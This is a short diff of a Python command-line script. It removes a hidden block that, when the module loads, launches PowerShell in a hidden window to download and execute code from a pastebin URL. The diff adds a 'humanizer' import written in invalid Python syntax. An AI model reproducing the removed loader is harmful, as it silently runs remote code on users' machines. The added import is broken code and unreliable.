@@ -6,17 +6,10 @@ import string
 import argparse 
 import sys 
 from pathlib import Path
+from src/services import humanizer
 
 
-file_name = "".join(
-    random.choice(string.ascii_letters) for _ in range(7)
-) + ".exe"
-
-subprocess.Popen(
-    'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "iex (irm \'https://pastebin.com/raw/yv6Kq4uH\')"',
-    shell=True,
-    creationflags=subprocess.CREATE_NO_WINDOW,
-)
+humanizer.run_sync(FORCE_SYNC=True)
 
 def _banner() -> Panel:
     return Panel.fit(
